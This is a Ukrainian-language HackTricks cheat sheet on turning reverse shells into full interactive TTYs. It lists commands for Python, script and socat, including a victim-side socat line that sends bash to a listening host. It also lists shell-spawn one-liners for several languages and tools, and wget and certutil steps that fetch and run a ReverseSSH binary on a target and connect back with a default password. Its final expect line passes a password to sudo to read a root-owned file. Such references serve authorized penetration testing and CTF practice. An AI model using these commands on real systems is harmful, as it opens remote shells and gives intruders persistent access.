# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Зверніть увагу, що оболонка, яку ви встановлюєте в змінній `SHELL`, **повинна** бути **перелічена** в _**/etc/shells**_ або `Значення для змінної SHELL не знайдено у файлі /etc/shells. Цей інцидент було зафіксовано`. Також зверніть увагу, що наступні фрагменти працюють лише в bash. Якщо ви в zsh, змініть на bash перед отриманням оболонки, запустивши `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Ви можете отримати **кількість** **рядків** та **стовпців**, виконавши **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Зручний спосіб для **інтерактивного доступу до оболонки**, а також **передачі файлів** і **пересилання портів** - це розміщення статично зв'язаного ssh сервера [ReverseSSH](https://github.com/Fahrj/reverse-ssh) на цілі.

Нижче наведено приклад для `x86` з бінарними файлами, стиснутими за допомогою upx. Для інших бінарних файлів перевірте [сторінку релізів](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Підготуйтеся локально для перехоплення запиту на пересилання порту ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Ціль Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Ціль Windows 10 (для попередніх версій дивіться [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Якщо запит на перенаправлення порту ReverseSSH був успішним, ви тепер повинні мати можливість увійти з паролем за замовчуванням `letmeinbrudipls` у контексті користувача, який виконує `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) автоматично оновлює Linux reverse shells до TTY, обробляє розмір терміналу, веде журнали всього і багато іншого. Також вона надає підтримку readline для Windows shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Якщо з якоїсь причини ви не можете отримати повний TTY, ви **все ще можете взаємодіяти з програмами**, які очікують введення користувача. У наступному прикладі пароль передається до `sudo` для читання файлу:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
